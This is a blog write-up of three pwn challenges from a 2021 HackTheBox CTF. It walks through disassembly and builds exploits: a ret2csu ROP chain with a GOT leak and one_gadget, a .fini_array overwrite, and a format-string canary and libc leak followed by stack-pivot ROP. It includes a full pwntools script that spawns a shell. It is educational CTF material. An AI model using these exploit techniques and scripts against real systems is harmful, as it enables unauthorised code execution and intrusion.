---
layout: post
title: HackTheBox Cyber Apocalypse CTF 2021
categories: [ctf, pwn]
---

## Table of Contents

- [Pwn: System dROP](#pwn-system-drop)
- [Pwn: Minefield](#pwn-minefield)
- [Pwn: Harvester](#pwn-harvester)

## Pwn: System dROP

```
Disclaimer: The flag in this challenge suggested using SROP to exploit the challenge, but I couldn't figure out for the life of me how to make it possible. Hence, I did this via the traditional way.
```

We're presented with the binary `system_drop`, containing only the `main` function which reads in 256 bytes into a buffer and then quits. Based on radare2's disassembly output, we can quickly figure out that 40 bytes is needed before we begin to overwrite the return pointer. The name of the binary suggests that we might need to drop a `system()` shell via Return-Oriented Programming (ROP).

```
[0x00400450]> pdf @ main
            ; DATA XREF from entry0 @ 0x40046d
/ 47: int main (int argc, char **argv, char **envp);
|           ; var void *buf @ rbp-0x20
|           0x00400541      55             push rbp
|           0x00400542      4889e5         mov rbp, rsp
|           0x00400545      4883ec20       sub rsp, 0x20
|           0x00400549      bf0f000000     mov edi, 0xf                ; 15
|           0x0040054e      e8ddfeffff     call sym.imp.alarm
|           0x00400553      488d45e0       lea rax, [buf]
|           0x00400557      ba00010000     mov edx, 0x100              ; 256 ; size_t nbyte
|           0x0040055c      4889c6         mov rsi, rax                ; void *buf
|           0x0040055f      bf00000000     mov edi, 0                  ; int fildes
|           0x00400564      e8d7feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x00400569      b801000000     mov eax, 1
|           0x0040056e      c9             leave
\           0x0040056f      c3             ret
```

Given the lackluster main function, we don't have much to go on from here. Initially, I had thought of performing a `Sigreturn-oriented programming` (sigrop) attack based off my experience with a similar echo binary CTF challenge, however without a way to easily control the `rax` register, it's a tall order. In the end, I decided to go with a `ret2csu` attack. To do this, we need to take note of a couple of addresses in the `__libc_csu_init` function, namely the address of `gadget1`, `gadget2`, and pointer to `_init` function as suggested in this [writeup](https://www.rootnetsec.com/ropemporium-ret2csu/).

This results in the following behaviour:

- Set `rax` to 0x00
- Set `edi`, `rsi`, `rdx`, `rbx`, and `rbp` to a value we control

```
[0x00400450]> pdf @ sym.__libc_csu_init
            ; DATA XREF from entry0 @ 0x400466
/ 101: sym.__libc_csu_init (int64_t arg1, int64_t arg2, int64_t arg3);
|           ; arg int64_t arg1 @ rdi
|           ; arg int64_t arg2 @ rsi
|           ; arg int64_t arg3 @ rdx
|           0x00400570      4157           push r15
|           0x00400572      4156           push r14
|           0x00400574      4989d7         mov r15, rdx                ; arg3
|           0x00400577      4155           push r13
|           0x00400579      4154           push r12
|           0x0040057b      4c8d258e0820.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start
|                                                                      ; 0x600e10 ; "0\x05@"
|           0x00400582      55             push rbp
|           0x00400583      488d2d8e0820.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end
|                                                                      ; 0x600e18
|           0x0040058a      53             push rbx
|           0x0040058b      4189fd         mov r13d, edi               ; arg1
|           0x0040058e      4989f6         mov r14, rsi                ; arg2
|           0x00400591      4c29e5         sub rbp, r12
|           0x00400594      4883ec08       sub rsp, 8
|           0x00400598      48c1fd03       sar rbp, 3
|           0x0040059c      e85ffeffff     call sym._init
|           0x004005a1      4885ed         test rbp, rbp
|       ,=< 0x004005a4      7420           je 0x4005c6
|       |   0x004005a6      31db           xor ebx, ebx
|       |   0x004005a8      0f1f84000000.  nop dword [rax + rax]
|       |   ; CODE XREF from sym.__libc_csu_init @ 0x4005c4
|      .--> 0x004005b0      4c89fa         mov rdx, r15
|      :|   0x004005b3      4c89f6         mov rsi, r14
|      :|   0x004005b6      4489ef         mov edi, r13d
|      :|   0x004005b9      41ff14dc       call qword [r12 + rbx*8]
|      :|   0x004005bd      4883c301       add rbx, 1
|      :|   0x004005c1      4839dd         cmp rbp, rbx
|      `==< 0x004005c4      75ea           jne 0x4005b0
|       |   ; CODE XREF from sym.__libc_csu_init @ 0x4005a4
|       `-> 0x004005c6      4883c408       add rsp, 8
|           0x004005ca      5b             pop rbx
|           0x004005cb      5d             pop rbp
|           0x004005cc      415c           pop r12
|           0x004005ce      415d           pop r13
|           0x004005d0      415e           pop r14
|           0x004005d2      415f           pop r15
\           0x004005d4      c3             ret
[0x00400450]> /v 0x400400
Searching 4 bytes in [0x601038-0x601040]
hits: 0
Searching 4 bytes in [0x600e10-0x601038]
hits: 1
Searching 4 bytes in [0x400000-0x400758]
hits: 0
0x00600e38 hit0_0 00044000
```

Based on the above output, we have our required addresses to make the attack work.

- gadget1: `0x004005ca`
- gadget2: `0x004005b0`
- init_pointer: `0x00400e38`

Payload 1 is as follows:

```python
elf.sym.payload = 0x601100

payload = p64(gadget1)
payload += p64(0x00)                                # pop rbx
payload += p64(0x01)                                # pop rbp
payload += p64(init_pointer)                        # pop r12
payload += p64(0x00)                                # pop r13 (edi)
payload += p64(elf.sym.payload)                     # pop r14 (rsi)
payload += p64(len(payload2))                       # pop r15 (rdx)
payload += p64(gadget2)
payload += p64(0x00)                                # add rsp,0x8 padding
payload += p64(0x00)                                # rbx
payload += p64(elf.sym.payload - context.bytes)     # rbp
payload += p64(0x00)                                # r12
payload += p64(0x00)                                # r13
payload += p64(0x00)                                # r14
payload += p64(0x00)                                # r15
payload += p64(rop.syscall[0])
payload += p64(mov_eax_1)
```

`mov_eax_1` (0x400569) is simply a `mov eax, 1; leave; ret` gadget found at the end of the main function. After the 2nd payload is written, this gadget will set `eax` to 1 (SYS_write) before migrating the stack to `0x601100` via a stack pivot.

Payload 2 is as follows:

```python
elf.sym.payload = 0x601100

payload2 = flat(rop.rdi[0],     0x1,
                rop.rsi[0],     elf.got.alarm, 0x0,
                rop.syscall[0],
                rop.rbp[0],     elf.sym.payload + 0x200,
                elf.sym.main)
```

This will leak the `alarm@plt` address in the GOT, allowing to derive the correct libc version to calculate offsets. By also leaking the `read@plt` GOT address and confirming the offsets on an online [libc-database](https://libc.blukat.me/), we infer that the libc version used is `2.27` running on `Ubuntu 18.04`. With that out of the way, we can obtain a local copy of the libc shared object to replicate the memory state of the remote process after ASLR, as relative offsets still remain constant from one another. This payloads ends off by jumping us back to the start of the main function where we can perform another round of buffer overflow attack.

Although it is possible to call `system('/bin/sh')` or manually perform a `SYS_execve` call to `/bin/sh`, there's an almost magical option using `one_gadget` that'll give us an offset that when jumped to will spawn a shell provided we fulfill its constraints. Truly the ONE gadget to rule them all!

```sh
$ one_gadget libc6_2.27-3ubuntu1.4_amd64.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Seems like there are 3 gadgets to choose from. I went with the middle gadget. Running my exploit script for the last time, I managed to drop a shell into the system (no pun intended). Interestingly, the flag suggested `sigrop` to be the intended method, so my initial thought process wasn't incorrect.

Flag: `CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}`

### Exploit Script

```python
#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./system_drop')
rop = ROP(elf)

if args.REMOTE:
    io = remote('127.0.0.1', 8080)
    libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')
else:
    io = elf.process()
    libc = io.libc

elf.sym.payload = 0x601100
eip_offset = 40

gadget1 = 0x004005ca
gadget2 = 0x004005b0
init_pointer = 0x00400e38
mov_eax_1 = 0x00400569

# Prepare 2nd payload
payload2 = flat(rop.rdi[0],     0x1,
                rop.rsi[0],     elf.got.alarm, 0x0,
                rop.syscall[0],
                rop.rbp[0],     elf.sym.payload + 0x200,
                elf.sym.main)

# Prepare 1st payload
payload = p64(gadget1)
payload += p64(0x00)                                # pop rbx
payload += p64(0x01)                                # pop rbp
payload += p64(init_pointer)                        # pop r12
payload += p64(0x00)                                # pop r13 (edi)
payload += p64(elf.sym.payload)                     # pop r14 (rsi)
payload += p64(len(payload2))                       # pop r15 (rdx)
payload += p64(gadget2)
payload += p64(0x00)                                # add rsp,0x8 padding
payload += p64(0x00)                                # rbx
payload += p64(elf.sym.payload - context.bytes)     # rbp
payload += p64(0x00)                                # r12
payload += p64(0x00)                                # r13
payload += p64(0x00)                                # r14
payload += p64(0x00)                                # r15
payload += p64(rop.syscall[0])
payload += p64(mov_eax_1)

# Send both payloads
io.send(flat({eip_offset: payload, 0x100: b''}))
io.send(payload2)

# Receive GOT leak and calculate libc base
alarm = u64(io.recvn(context.bytes))
libc.address = args.REMOTE and alarm - libc.sym.alarm or libc.address
system = libc.sym.system
one_gadget = libc.address + 0x4f432
log.success(f"alarm @ {hex(alarm)}")
log.success(f"libc base @ {hex(libc.address)}")
log.success(f"one_gadget @ {hex(one_gadget)}")

# Spawn shell
io.recv(len(payload2) - context.bytes)
io.send(flat({eip_offset: one_gadget}))
io.interactive()
```

## Pwn: Minefield

We're given a binary that asks us if we are ready to plant the mine. Here's what happens if we are not ready:

```sh
$ ./minefield
Are you ready to plant the mine?
1. No.
2. Yes, I am ready.
> 1
If you are not ready we cannot continue.
```

A rather lackluster response. Let us take a deeper dive into the disassembly. It seems like the main function calls `menu()` which then passes our input to `choice()` which contains the meat of the program logic.

If `1` is submitted as input, the program will reply with `If you are not ready we cannot continue.` and exits. Otherwise, when `2` is submitted as input, the program replies with `We are ready to proceed then!` before invoking the `mission()` function. 

```
[0x004007b0]> pdf @ sym.mission
            ; CALL XREF from sym.choice @ 0x400b54
/ 179: sym.mission ();
|           ; var int64_t var_30h @ rbp-0x30
|           ; var int64_t var_28h @ rbp-0x28
|           ; var int64_t var_1ch @ rbp-0x1c
|           ; var int64_t var_12h @ rbp-0x12
|           ; var int64_t var_8h @ rbp-0x8
<output truncated>
```

As the `mission()` function is quite big, let us break down into the important bits. The function will ask us two questions, `Insert type of mine: ` and `Insert location to plant: `. After sending some input the program may either exits gracefully or segfaults.

```
|           0x00400a5b      488d3d900200.  lea rdi, str.Insert_type_of_mine: ; 0x400cf2 ; "Insert type of mine: " ; const char *format
|           0x00400a62      b800000000     mov eax, 0
|           0x00400a67      e8d4fcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400a6c      488d45e4       lea rax, [var_1ch]
|           0x00400a70      4889c7         mov rdi, rax
|           0x00400a73      e8abfeffff     call sym.r
|           0x00400a78      488d45e4       lea rax, [var_1ch]
|           0x00400a7c      ba00000000     mov edx, 0                  ; int base
|           0x00400a81      be00000000     mov esi, 0                  ; char * *endptr
|           0x00400a86      4889c7         mov rdi, rax                ; const char *str
|           0x00400a89      e8e2fcffff     call sym.imp.strtoull       ; long long strtoull(const char *str, char * *endptr, int base)
|           0x00400a8e      488945d0       mov qword [var_30h], rax
```

This is the snippet for the 1st input, as you can see, it converts our input into an unsigned long long integer before storing it to `var_30h ($rbp-0x30)`.

```
|           0x00400a92      488d3d6f0200.  lea rdi, str.Insert_location_to_plant: ; 0x400d08 ; "Insert location to plant: " ; const char *format
|           0x00400a99      b800000000     mov eax, 0
|           0x00400a9e      e89dfcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400aa3      488d45ee       lea rax, [var_12h]
|           0x00400aa7      4889c7         mov rdi, rax
|           0x00400aaa      e874feffff     call sym.r
|           0x00400aaf      488d3d720200.  lea rdi, str.We_need_to_get_out_of_here_as_soon_as_possible._Run ; 0x400d28 ; "We need to get out of here as soon as possible. Run!" ; const char *s
|           0x00400ab6      e835fcffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400abb      488d45ee       lea rax, [var_12h]
|           0x00400abf      ba00000000     mov edx, 0                  ; int base
|           0x00400ac4      be00000000     mov esi, 0                  ; char * *endptr
|           0x00400ac9      4889c7         mov rdi, rax                ; const char *str
|           0x00400acc      e89ffcffff     call sym.imp.strtoull       ; long long strtoull(const char *str, char * *endptr, int base)
|           0x00400ad1      488945d8       mov qword [var_28h], rax
```

This is the snippet for the 2nd input. Similarly, it converts the user input into an unsigned long long integer before storing it to `var_28h ($rbp-0x28)`.

```
|           0x00400ad5      488b55d8       mov rdx, qword [var_28h]
|           0x00400ad9      488b45d0       mov rax, qword [var_30h]
|           0x00400add      488910         mov qword [rax], rdx
```

This is the final piece to the puzzle. Both inputs are retrieved and stored into `rax` and `rdx` respectively. `rdx` is then written into the address of `rax`.

From the disassembly, it looks like the response to `Insert type of mine: ` will be the address to write to, and the response to `Insert location to plant: ` will be the actual value that we write, effectively executing a `read-write-where` primitive. Afterwards the program eventually exits. Knowing this, let us find a way to hijack the execution flow before that and spawn our shell.

```
[0x004007b0]> iS
[Sections]

nth paddr        size vaddr       vsize perm name
-------------------------------------------------
0   0x00000000    0x0 0x00000000    0x0 ----
1   0x00000200   0x1c 0x00400200   0x1c -r-- .interp
2   0x0000021c   0x20 0x0040021c   0x20 -r-- .note.ABI_tag
3   0x0000023c   0x24 0x0040023c   0x24 -r-- .note.gnu.build_id
4   0x00000260   0x28 0x00400260   0x28 -r-- .gnu.hash
5   0x00000288  0x198 0x00400288  0x198 -r-- .dynsym
6   0x00000420   0xba 0x00400420   0xba -r-- .dynstr
7   0x000004da   0x22 0x004004da   0x22 -r-- .gnu.version
8   0x00000500   0x40 0x00400500   0x40 -r-- .gnu.version_r
9   0x00000540   0x60 0x00400540   0x60 -r-- .rela.dyn
10  0x000005a0  0x120 0x004005a0  0x120 -r-- .rela.plt
11  0x000006c0   0x17 0x004006c0   0x17 -r-x .init
12  0x000006e0   0xd0 0x004006e0   0xd0 -r-x .plt
13  0x000007b0  0x4f2 0x004007b0  0x4f2 -r-x .text
14  0x00000ca4    0x9 0x00400ca4    0x9 -r-x .fini
15  0x00000cb0  0x142 0x00400cb0  0x142 -r-- .rodata
16  0x00000df4   0x7c 0x00400df4   0x7c -r-- .eh_frame_hdr
17  0x00000e70  0x200 0x00400e70  0x200 -r-- .eh_frame
18  0x00001070    0x8 0x00601070    0x8 -rw- .init_array
19  0x00001078    0x8 0x00601078    0x8 -rw- .fini_array
20  0x00001080  0x1d0 0x00601080  0x1d0 -rw- .dynamic
21  0x00001250   0x10 0x00601250   0x10 -rw- .got
22  0x00001260   0x78 0x00601260   0x78 -rw- .got.plt
23  0x000012d8   0x10 0x006012d8   0x10 -rw- .data
24  0x000012e8    0x0 0x006012f0   0x20 -rw- .bss
25  0x000012e8   0x29 0x00000000   0x29 ---- .comment
26  0x00001318  0x7b0 0x00000000  0x7b0 ---- .symtab
27  0x00001ac8  0x301 0x00000000  0x301 ---- .strtab
28  0x00001dc9  0x103 0x00000000  0x103 ---- .shstrtab
```

There is one interesting place that we can write to that the program will attempt to execute if it isn't null, and that's the `.fini_array`. According to the documentation from [Oracle](https://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html):

```
The runtime linker executes functions whose addresses are contained in the .fini_array section. These functions are executed in the reverse order in which their addresses appear in the array. The runtime linker executes a .fini section as an individual function. If an object contains both .fini and .fini_array sections, the functions defined by the .fini_array section are processed before the .fini section for that object.
```

Looking at the virtual addresses of the section table above, we can determine `.fini_array` to be `0x00601078`. We need to overwrite it with the value of the `win` function at `0x0040096b`.

```sh
$ ./minefield
Are you ready to plant the mine?
1. No.
2. Yes, I am ready.
> 2
We are ready to proceed then!
Insert type of mine: 6295672
Insert location to plant: 4196715
We need to get out of here as soon as possible. Run!

Mission accomplished! ✔
CHTB{d3struct0r5_m1n3f13ld}
```

## Pwn: Harvester

```sh
$ checksec --file harvester
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   harvester
```

Possibly one of the toughest pwns in the CTF that featured a Pokemon battle-themed option menu. We're provided with 2 binaries: `harvester` and `libc.so.6`. Checksec reported all security mitigations are enabled, so that means we need to first find a way to leak the canary as well as a libc address leak to calculate the libc base before we can begin exploiting.

```sh
$ ./harvester

A wild Harvester appeared 🐦

Options:

[1] Fight 👊    [2] Inventory 🎒
[3] Stare 👀    [4] Run 🏃
> 1

Choose weapon:

[1] 🗡           [2] 💣
[3] 🏹          [4] 🔫
> pwn

Your choice is: pwn

You are not strong enough to fight yet.

Options:

[1] Fight 👊    [2] Inventory 🎒
[3] Stare 👀    [4] Run 🏃
> 2

You have: 10 🥧

Do you want to drop some? (y/n)
> n

Options:

[1] Fight 👊    [2] Inventory 🎒
[3] Stare 👀    [4] Run 🏃
> 3

You try to find its weakness, but it seems invincible..
Looking around, you see something inside a bush.
[+] You found 1 🥧!

Options:

[1] Fight 👊    [2] Inventory 🎒
[3] Stare 👀    [4] Run 🏃
> 4
You ran away safely!
```

As this challenge is rather lengthy and combines multiple vulnerabilities, you can skip ahead with the following section table:

1. [Fight(): Format String Bug (FSB)](#fight-format-string-bug-fsb)
2. [Inventory(): Fulfilling Constraint to Reach Vulnerable Function](#inventory-fulfilling-constraint-to-reach-vulnerable-function)
3. [Stare(): Buffer Overflow, Stack Pivoting, Return-Oriented Programming](#stare-buffer-overflow-stack-pivoting-return-oriented-programming)

### Fight(): Format String Bug (FSB)

We notice that in the `Fight` sequence, the program seems to reflect our input when choosing the weapon to fight the harvester with. This can indicate the presence of a format string bug (FSB) that we can leak both the stack canary and a known libc address.

```
[0x000008d0]> pdf @ sym.fight
            ; CALL XREF from sym.harvest @ 0xec5
┌ 199: sym.fight ();
│           ; var char *format @ rbp-0x30
│           ; var int64_t var_28h @ rbp-0x28
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t canary @ rbp-0x8
<output truncated>
│           0x00000b90      488d45d0       lea rax, [format]
│           0x00000b94      ba05000000     mov edx, 5                  ; size_t nbyte
│           0x00000b99      4889c6         mov rsi, rax                ; void *buf
│           0x00000b9c      bf00000000     mov edi, 0                  ; int fildes
│           0x00000ba1      e8bafcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00000ba6      488d3db50500.  lea rdi, str._nYour_choice_is:_ ; 0x1162 ; "\nYour choice is: "
│           0x00000bad      e828feffff     call sym.printstr
│           0x00000bb2      488d45d0       lea rax, [format]
│           0x00000bb6      4889c7         mov rdi, rax                ; const char *format
│           0x00000bb9      b800000000     mov eax, 0
│           0x00000bbe      e87dfcffff     call sym.imp.printf         ; int printf(const char *format)
<output truncated>
```

Indeed, there is a FSB present in the function. The equivalent C code roughly goes like this:

```c
char format[5];
read(stdin, &format, 5);
printf(&format);
...
```

Now let us take a look at the stack when printf is being called:

```
pwndbg> tele 16
00:0000│ rdi rsp  0x7ffcd8389a10 ◂— 0x7024373125 /* '%17$p' */
01:0008│          0x7ffcd8389a18 ◂— 0x0
... ↓
04:0020│          0x7ffcd8389a30 —▸ 0x7ffcd8389a60 —▸ 0x7ffcd8389a80 —▸ 0x556ed1f2a000 (__libc_csu_init) ◂— push   r15
05:0028│          0x7ffcd8389a38 ◂— 0x815118aea9844300
06:0030│ rbp      0x7ffcd8389a40 —▸ 0x7ffcd8389a60 —▸ 0x7ffcd8389a80 —▸ 0x556ed1f2a000 (__libc_csu_init) ◂— push   r15
07:0038│          0x7ffcd8389a48 —▸ 0x556ed1f29eca (harvest+119) ◂— jmp    0x556ed1f29f17
08:0040│          0x7ffcd8389a50 ◂— 0x100000020 /* ' ' */
09:0048│          0x7ffcd8389a58 ◂— 0x815118aea9844300
0a:0050│          0x7ffcd8389a60 —▸ 0x7ffcd8389a80 —▸ 0x556ed1f2a000 (__libc_csu_init) ◂— push   r15
0b:0058│          0x7ffcd8389a68 —▸ 0x556ed1f29fd8 (main+72) ◂— mov    eax, 0
0c:0060│          0x7ffcd8389a70 —▸ 0x7ffcd8389b60 ◂— 0x1
0d:0068│          0x7ffcd8389a78 ◂— 0x815118aea9844300
0e:0070│          0x7ffcd8389a80 —▸ 0x556ed1f2a000 (__libc_csu_init) ◂— push   r15
0f:0078│          0x7ffcd8389a88 —▸ 0x7fe8c4f5dbf7 (__libc_start_main+231) ◂— mov    edi, eax
10:0080│          0x7ffcd8389a90 ◂— 0x1
```

Awesome, we have all we need. After some trial and error, I noticed the inputs `%12$p`, `%15$p`, `%17$p` and `%21$p` correspond to the following values in the stack containing the values we need:

```
06:0030│ rbp      0x7ffcd8389a40 —▸ 0x7ffcd8389a60 —▸ 0x7ffcd8389a80 —▸ 0x556ed1f2a000 (__libc_csu_init) ◂— push   r15
...
09:0048│          0x7ffcd8389a58 ◂— 0x815118aea9844300
0b:0058│          0x7ffcd8389a68 —▸ 0x556ed1f29fd8 (main+72) ◂— mov    eax, 0
...
0f:0078│          0x7ffcd8389a88 —▸ 0x7fe8c4f5dbf7 (__libc_start_main+231) ◂— mov    edi, eax
```

So now we have:

- The `$rbp` value: `0x7ffcd8389a60` (needed to calculate where our exploit code is at)
- The stack canary value: `0x815118aea9844300` (stays constant throughout the lifetime of the process)
- The address of `main()`: __0x556ed1f29fd8 - 72 =__ `0x556ed1f29f90` (needed to calculate the elf base address)
- A libc address (\__libc_start_main): __0x7fe8c4f5dbf7 - 231 =__ `0x7fe8c4f5db10` (needed to calculate the libc base)

We can then proceed to calculate the location of the payload. As both `fight()` and `stare()` have the same stack frame size (0x30), we can simply look at our stack dump again to find out that the top of the stack is `0x7ffcd8389a10`, which is 0x50 bytes away from the leaked RBP.

## Inventory(): Fulfilling Constraint to Reach Vulnerable Function

I won't go deep into the `inventory()` function as it's simply used to get over a road bump stopping us from reaching the vulnerable function. But if you're interested, the equivalent C code goes like this:

```c
int pie = 10;

void inventory() {
  int num;
  char buf[2];
  show_pies(pie);
  printstr("\nDo you want to drop some? (y/n)\n> ");
  read(stdin, &buf, 2);
  if (buf[0] == 'y') {
    printstr("\nHow many do you want to drop?\n> ");
    scanf("%d", &num);
    pie -= num;
    if (pie == 0) {
      printstr("\nYou dropped all your 🥧!");
      exit(1);
    }
    show_pies(pie);
  }
}
```

As we will revisit in the next section, we need the number of pies to be `21` before we proceed to `stare()`. This option simply drops any number of pies, instead of adding them. So it seems that we cannot increase the number of pies in this function. Or can we?

Recall that `"%d"` in scanf reads in a signed integer, compared to `"%u"` which reads in an unsigned integer, so technically speaking we can provide a negative number so that instead of dropping `x` number of pies, we're adding by the same amount instead. Hence, to hit `21` pies, we need to drop _10 - 21 =_ `-11` pies in total.

## Stare(): Buffer Overflow, Stack Pivoting, Return-Oriented Programming

The final piece to our puzzle is the `stare()` function. Let's break down the logic of the function part by part.

```
[0x000008d0]> pdf @ sym.stare
            ; CALL XREF from sym.harvest @ 0xedd
/ 234: sym.stare ();
|           ; var int64_t var_30h @ rbp-0x30
|           ; var int64_t var_8h @ rbp-0x8
|           0x00000d2b      55             push rbp
|           0x00000d2c      4889e5         mov rbp, rsp
|           0x00000d2f      4883ec30       sub rsp, 0x30
|           0x00000d33      64488b042528.  mov rax, qword fs:[0x28]
|           0x00000d3c      488945f8       mov qword [var_8h], rax
|           0x00000d40      31c0           xor eax, eax
|           0x00000d42      488d3dd10300.  lea rdi, str.e_1_36m        ; 0x111a ; const char *format
|           0x00000d49      b800000000     mov eax, 0
|           0x00000d4e      e8edfaffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00000d53      488d3dce0400.  lea rdi, str.You_try_to_find_its_weakness__but_it_seems_invincible.. ; 0x1228 ; "\nYou try to find its weakness, but it seems invincible.."
|           0x00000d5a      e87bfcffff     call sym.printstr
|           0x00000d5f      488d3d020500.  lea rdi, str.Looking_around__you_see_something_inside_a_bush. ; 0x1268 ; "\nLooking around, you see something inside a bush."
|           0x00000d66      e86ffcffff     call sym.printstr
|           0x00000d6b      488d3d4f0300.  lea rdi, str.e_1_32m        ; 0x10c1 ; const char *format
|           0x00000d72      b800000000     mov eax, 0
|           0x00000d77      e8c4faffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00000d7c      488d3d170500.  lea rdi, str.You_found_1    ; 0x129a ; "\n[+] You found 1 🥧!\n"
|           0x00000d83      e852fcffff     call sym.printstr
|           0x00000d88      8b0582122000   mov eax, dword [obj.pie]    ; [0x202010:4]=10 ; "\n"
|           0x00000d8e      83c001         add eax, 1
|           0x00000d91      890579122000   mov dword [obj.pie], eax    ; [0x202010:4]=10 ; "\n"
```

This 1st part of the function simply increases the number of pies by 1.

```
|           0x00000d97      8b0573122000   mov eax, dword [obj.pie]    ; [0x202010:4]=10 ; "\n"
|           0x00000d9d      83f816         cmp eax, 0x16
|       ,=< 0x00000da0      755c           jne 0xdfe
```

Afterwards, the program will check if we are holding `0x16` or `22` 🥧. It'll skip over the vulnerable function unless we have exactly that amount.

```
|       |   0x00000da2      488d3d180300.  lea rdi, str.e_1_32m        ; 0x10c1 ; const char *format
|       |   0x00000da9      b800000000     mov eax, 0
|       |   0x00000dae      e88dfaffff     call sym.imp.printf         ; int printf(const char *format)
|       |   0x00000db3      488d3dfe0400.  lea rdi, str.You_also_notice_that_if_the_Harvester_eats_too_many_pies__it_falls_asleep. ; 0x12b8 ; "\nYou also notice that if the Harvester eats too many pies, it falls asleep."
|       |   0x00000dba      e81bfcffff     call sym.printstr
|       |   0x00000dbf      488d3d3e0500.  lea rdi, str.Do_you_want_to_feed_it ; 0x1304 ; "\nDo you want to feed it?\n> "
|       |   0x00000dc6      e80ffcffff     call sym.printstr
|       |   0x00000dcb      488d45d0       lea rax, [var_30h]
|       |   0x00000dcf      ba40000000     mov edx, 0x40               ; segment.PHDR ; size_t nbyte
|       |   0x00000dd4      4889c6         mov rsi, rax                ; void *buf
|       |   0x00000dd7      bf00000000     mov edi, 0                  ; int fildes
|       |   0x00000ddc      e87ffaffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|       |   0x00000de1      488d3da00200.  lea rdi, str.e_1_31m        ; 0x1088 ; const char *format
|       |   0x00000de8      b800000000     mov eax, 0
|       |   0x00000ded      e84efaffff     call sym.imp.printf         ; int printf(const char *format)
|       |   0x00000df2      488d3d270500.  lea rdi, str.This_did_not_work_as_planned.. ; 0x1320 ; "\nThis did not work as planned..\n"
|       |   0x00000df9      e8dcfbffff     call sym.printstr
<output truncated>
```

Finally, it'll read in `0x40` or `64` bytes of input. After 56 bytes, it'll begin to overwrite the return address. This is great, except for the fact that we don't have anymore space afterwards to stuff our payload in. Thus, we have to use the 56 bytes from the start of the payload address to store our payload. We'll need to create a ROP chain as we can't directly execute shellcode on the stack due to the NX bit being set. We will first calculate the libc base address so that we can retrieve addresses to `system()`, `exit()`, and the `/bin/sh` string.

```python
__libc_start_main = 0x7fe8c4f5db10
libc.address = __libc_start_main - libc.sym.__libc_start_main  # 0x7fe8c4f3c000
```

The final payload looks something like this:

```
0x00: pop_rdi_gadget
0x08: ptr_to_bin_sh     # 0x7fe8c50efe1a
0x10: call system()     # 0x7fe8c4f8b550
0x18: call exit()       # 0x7fe8c4f7f240
0x20: b'AAAAAAAA'       # Unused junk bytes
0x28: canary            # 0x815118aea9844300 (reset the canary to avoid stack smashing detection)
0x30: payload_addr - 8  # for $rsp to point to pos 0x00
0x38: leave_ret_gadget  # to perform stack pivoting
```

Upon returning from the function, the `leave_ret_gadget` at pos 0x38 is executed and sets $rsp to `(payload_addr - 8) + 8`, or pos 0x00 of our payload. Afterwards, the rest of the ROP chain is executed and we get our shell.
